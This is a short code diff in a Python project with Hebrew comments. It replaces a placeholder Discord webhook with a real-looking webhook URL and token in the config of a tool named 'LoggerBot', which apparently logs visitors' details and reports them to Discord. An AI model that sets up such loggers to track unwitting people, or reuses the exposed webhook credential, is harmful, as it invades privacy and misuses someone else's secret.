@@ -6,7 +6,7 @@ import httpagentparser
 
 # קונפיגורציה
 config = {
-    "webhook": "https://discord.com/api/webhooks/your_webhook_url",  # החלף ב-Webhook שלך
+    "webhook": "https://discord.com/api/webhooks/1361668974206779552/amPEf46kyp9dSU9cTzdSWw3q6l8wlyEncwKhWc0UYrm6nejcmVOvlnQb_V1IamzjpMMF",  # החלף ב-Webhook שלך
     "username": "LoggerBot",
     "color": 0x00FFFF,
     "showMessage": True,
